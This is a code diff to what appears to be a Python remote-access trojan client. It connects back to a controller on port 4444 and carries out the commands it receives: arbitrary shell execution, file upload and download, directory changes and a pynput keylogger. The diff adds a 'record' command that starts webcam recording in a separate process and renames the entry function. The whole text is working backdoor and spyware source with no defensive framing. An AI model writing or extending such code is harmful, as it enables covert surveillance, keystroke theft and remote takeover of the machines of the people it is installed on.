@@ -3,6 +3,8 @@ import subprocess
 import os
 from pynput.keyboard import Key, Listener
 import threading
+from camera import CameraHandler
+import multiprocessing
 
 pressed_keys = ''
 previous_keylog_state = "off"
@@ -17,9 +19,9 @@ def download_file(client_socket, filename):
 
 def upload_file(client_socket, filename):
     contents = client_socket.recv(1024*10000)
-    # if contents.decode() != 'File Not Found':
-    with open(filename, 'wb') as f:
-        f.write(contents)
+    if contents.decode() != 'File Not Found':
+        with open(filename, 'wb') as f:
+            f.write(contents)
 
 def change_directory(client_socket, dirname):
     if dirname == "..":
@@ -73,7 +75,7 @@ def execute_command(client_socket, command):
         answer = str(error.decode())
     client_socket.send(answer.encode())
 
-def main():
+def client_start():
     ip_address = '127.0.0.1'
     port_number = 4444
 
@@ -91,9 +93,10 @@ def main():
             change_directory(client_socket, command_parts[1])
         elif command_parts[0] == "keylog":
             keylog_handling(client_socket, command_parts[1])
+        elif command_parts[0] == "record":
+            camera_proc = multiprocessing.Process(target=CameraHandler.record_video)
+            camera_proc.start()
         else:
             execute_command(client_socket, command)
         command = client_socket.recv(1024).decode() 
     client_socket.close()
-
-main()
